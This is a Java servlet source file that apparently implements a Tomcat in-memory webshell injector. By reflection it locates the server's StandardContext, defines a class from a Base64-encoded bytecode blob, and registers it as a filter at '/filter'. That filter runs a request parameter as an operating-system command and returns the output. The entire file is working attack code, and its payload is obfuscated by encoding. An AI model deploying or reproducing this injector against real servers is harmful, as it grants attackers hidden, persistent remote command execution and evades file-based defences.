package com.axisx;

import sun.misc.BASE64Decoder;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Map;

public class InjectFilterByServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        Object StandardContext= null;
        String filtername="MyFilter";
        try{
            StandardContext = getContext();
            ClassLoader classLoader=Thread.currentThread().getContextClassLoader();
            String FilterBase64="yv66vgAAADQAvQoAJABwBwBxCgAjAHIIAHMLAAIAdAoAIwB1CwAhAHYKAHcAeAcAeQoACQB6CgB7AHwKAHsAfQoAfgB/BwCACgAOAIEHAIIKABAAgwcAhAoAEgBwCgAQAIUHAIYKABUAcAoAFQCHCACICgAVAIkKABIAigoAEgCJCgAkAIsIADwKAIwAjQoAjgCPCgCOAJAHAJEIADoHAJIHAJMHAJQBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEACkxNeUZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwCVAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQAEdmFyOAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAVjaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEABHJlc3ABAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcAkgcAlgcAlwcAmAcAcQcAkQcAeQcAmQEAB2Rlc3Ryb3kBAAtDb21tYW5kRXhlYwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQACcnQBABNMamF2YS9sYW5nL1J1bnRpbWU7AQAEcHJvYwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAZzdGRlcnIBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAJzYgEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwcAmgcAmwcAnAcAnQcAgAcAggcAhAEAFmdldFJlc3BvbnNlRnJvbVJlcXVlc3QBAFEoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7KUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAR2YXIzAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABHZhcjQBAAR2YXI1AQASTGphdmEvbGFuZy9PYmplY3Q7AQAEdmFyNgEABHZhcjEBAAR2YXIyAQAKU291cmNlRmlsZQEADU15RmlsdGVyLmphdmEMACYAJwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMAGQAZQEABmZpbHRlcgwAngBPDABOAE8MAJ8AoAcAoQwAogCjAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwApAAnBwCbDAClAKYMAKcAqAcAnAwAqQCqAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAJgCrAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAJgCsAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwArQCuAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAK8AsAEAAQoMALEArgwArwCyDACzALQHALUMALYAtwcAuAwAuQC6DAC7ALwBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACE15RmlsdGVyAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1J1bnRpbWUBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAxnZXRQYXJhbWV0ZXIBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAPcHJpbnRTdGFja1RyYWNlAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwAhACMAJAABACUAAAAGAAEAJgAnAAEAKAAAAC8AAQABAAAABSq3AAGxAAAAAgApAAAABgABAAAACgAqAAAADAABAAAABQArACwAAAABAC0ALgACACgAAAA1AAAAAgAAAAGxAAAAAgApAAAABgABAAAADgAqAAAAFgACAAAAAQArACwAAAAAAAEALwAwAAEAMQAAAAQAAQAyAAEAMwA0AAIAKAAAAQYAAgAIAAAAOyvAAAI6BAE6BSoZBLYAAzoFGQQSBLkABQIAOgYqGQa2AAY6BxkFuQAHAQAZB7YACKcACjoGGQa2AAqxAAEACQAwADMACQADACkAAAAqAAoAAAASAAYAEwAJABYAEQAXABwAGAAkABkAMAAcADMAGgA1ABsAOgAeACoAAABcAAkAHAAUADUANgAGACQADAA3ADYABwA1AAUAOAA5AAYAAAA7ACsALAAAAAAAOwA6ADsAAQAAADsAPAA9AAIAAAA7AD4APwADAAYANQBAAEEABAAJADIAQgBDAAUARAAAAB8AAv8AMwAGBwBFBwBGBwBHBwBIBwBJBwBKAAEHAEsGADEAAAAGAAIATAAyAAEATQAnAAEAKAAAACsAAAABAAAAAbEAAAACACkAAAAGAAEAAAAjACoAAAAMAAEAAAABACsALAAAAAEATgBPAAIAKAAAASkAAwAJAAAAYLgAC00sK7YADE4ttgANOgS7AA5ZGQS3AA86BbsAEFkZBbcAEToGAToHuwASWbcAEzoIGQa2ABRZOgfGACAZCLsAFVm3ABYZB7YAFxIYtgAXtgAZtgAaV6f/2xkItgAbsAAAAAMAKQAAACoACgAAACYABAAnAAoAKAAQACkAGwAqACYAKwApACwAMgAtAD0ALgBaADAAKgAAAFwACQAAAGAAKwAsAAAAAABgADUANgABAAQAXABQAFEAAgAKAFYAUgBTAAMAEABQAFQAVQAEABsARQBWAFcABQAmADoAWABZAAYAKQA3AFoANgAHADIALgBbAFwACABEAAAAJQAC/wAyAAkHAEUHAF0HAF4HAF8HAGAHAGEHAGIHAF0HAGMAACcAMQAAAAQAAQAJACEAZABlAAEAKAAAAUcAAgAHAAAAWwFNK7YAHBIdtgAeTi0EtgAfLSu2ACDAACFNpwA/Tiu2ABwSIrYAHjoEGQQEtgAfGQQrtgAgOgUZBbYAHBIdtgAeOgYZBgS2AB8ZBhkFtgAgwAAhTacABToELLAAAgACABoAHQAJAB4AVABXAAkAAwApAAAAPgAPAAAANAACADcADAA4ABEAOQAaAEQAHQA6AB4APAApAD0ALwA+ADcAPwBDAEAASQBBAFQAQwBXAEIAWQBGACoAAABSAAgADAAOAGYAZwADACkAKwBoAGcABAA3AB0AaQBqAAUAQwARAGsAZwAGAB4AOwA4ADkAAwAAAFsAKwAsAAAAAABbAGwAQQABAAIAWQBtAEMAAgBEAAAALgAD/wAdAAMHAEUHAEkHAEoAAQcAS/8AOQAEBwBFBwBJBwBKBwBLAAEHAEv6AAEAAQBuAAAAAgBv";
            byte[] FilterClass = new BASE64Decoder().decodeBuffer(FilterBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);
            Class filterClass = (Class) defineClass1.invoke(classLoader, FilterClass, 0, FilterClass.length);
            Object filterObject=(Object)filterClass.newInstance();

            // FilterDef
            Class<?> FilterDefClass=classLoader.loadClass("org.apache.catalina.deploy.FilterDef");
            Constructor FilterDefCons=FilterDefClass.getDeclaredConstructor();
            FilterDefCons.setAccessible(true);
            Object filterDef=FilterDefCons.newInstance();

            Method m1=filterDef.getClass().getDeclaredMethod("setFilterName",String.class);
            m1.setAccessible(true);
            m1.invoke(filterDef,filtername);

            Method m2=filterDef.getClass().getDeclaredMethod("setFilterClass",String.class);
            m2.setAccessible(true);
            m2.invoke(filterDef,filterObject.getClass().getName());

            Method m3=StandardContext.getClass().getDeclaredMethod("addFilterDef",FilterDefClass);
            m3.setAccessible(true);
            m3.invoke(StandardContext,filterDef);


            // FilterMap
            Class<?> FilterMapClass=classLoader.loadClass("org.apache.catalina.deploy.FilterMap");
            Constructor FilterMapCons=FilterMapClass.getDeclaredConstructor();
            FilterMapCons.setAccessible(true);
            Object filterMap=FilterMapCons.newInstance();

            Method m4=filterMap.getClass().getDeclaredMethod("addURLPattern",String.class);
            m4.setAccessible(true);
            m4.invoke(filterMap,"/filter");

            Method m5=filterMap.getClass().getDeclaredMethod("setFilterName",String.class);
            m5.setAccessible(true);
            m5.invoke(filterMap,filtername);

            Method m6=StandardContext.getClass().getDeclaredMethod("addFilterMap",FilterMapClass);
            m6.setAccessible(true);
            m6.invoke(StandardContext,filterMap);

            Class<?> Context=classLoader.loadClass("org.apache.catalina.Context");
            Class<?> ApplicationFilterConfigClass=classLoader.loadClass("org.apache.catalina.core.ApplicationFilterConfig");
            Constructor ApplicationFilterCons=ApplicationFilterConfigClass.getDeclaredConstructor(Context,FilterDefClass);
            ApplicationFilterCons.setAccessible(true);
            Object ApplicationFilterObj=ApplicationFilterCons.newInstance(StandardContext,filterDef);
            Field f1=StandardContext.getClass().getDeclaredField("filterConfigs");
            f1.setAccessible(true);
            Map filterConfigs=(Map)f1.get(StandardContext);
            filterConfigs.put(filtername,ApplicationFilterObj);



        } catch (Exception e){e.printStackTrace();}
    }


    public Object getContext() throws NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        ThreadGroup threadGroup=Thread.currentThread().getThreadGroup();
        Field field=threadGroup.getClass().getDeclaredField("threads");
        field.setAccessible(true);
        Thread[] threads=(Thread[])field.get(threadGroup);
        for(Thread thread:threads) {
            if (thread.getName().contains("Acceptor") && thread.getName().contains("http")) {
                Field tfield = thread.getClass().getDeclaredField("target");
                tfield.setAccessible(true);
                Object JioEndpoint$ = tfield.get(thread);
                Field thisField = JioEndpoint$.getClass().getDeclaredField("this$0");
                thisField.setAccessible(true);
                Object JioEndpointO = thisField.get(JioEndpoint$);
                Field handlerField = JioEndpointO.getClass().getDeclaredField("handler");
                ;
                handlerField.setAccessible(true);
                Object Http11Protocol = handlerField.get(JioEndpointO);
                Field globalField = Http11Protocol.getClass().getDeclaredField("global");
                globalField.setAccessible(true);
                Object RequestGroupInof = globalField.get(Http11Protocol);
                Field f2 = RequestGroupInof.getClass().getDeclaredField("processors");
                f2.setAccessible(true);
                List Processors = (List) f2.get(RequestGroupInof);
                for (int i = 0; i < Processors.size(); i++) {
                    Object RequestInfo = (Object) Processors.get(i);
                    Field f3 = RequestInfo.getClass().getDeclaredField("req");
                    f3.setAccessible(true);
                    Object Request = f3.get(RequestInfo);
                    Object Request1 = Request.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(Request, 1);
                    Field f4 = Request1.getClass().getDeclaredField("context");
                    f4.setAccessible(true);
                    Object StandardContext = f4.get(Request1);
                    if (StandardContext != null) {
                        return StandardContext;
                    }
                }
            }
        }
        return null;
    }
}
